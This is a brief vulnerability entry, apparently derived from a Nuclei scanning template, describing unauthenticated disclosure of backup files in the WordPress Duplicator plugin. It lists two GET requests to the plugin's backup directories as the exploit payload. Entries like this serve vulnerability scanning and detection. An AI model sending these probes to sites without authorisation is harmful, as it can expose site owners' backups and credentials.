# Vulnerability: WordPress Duplicator Plugin - Information disclosure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`unauthenticated-duplicator-disclosure.yaml`)

## Description
Unauthenticated Information disclosure of Duplicator WordPress plugin sensitive files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/backups-dup-lite/tmp/
GET {{BaseURL}}/wp-content/backups-dup-lite
```

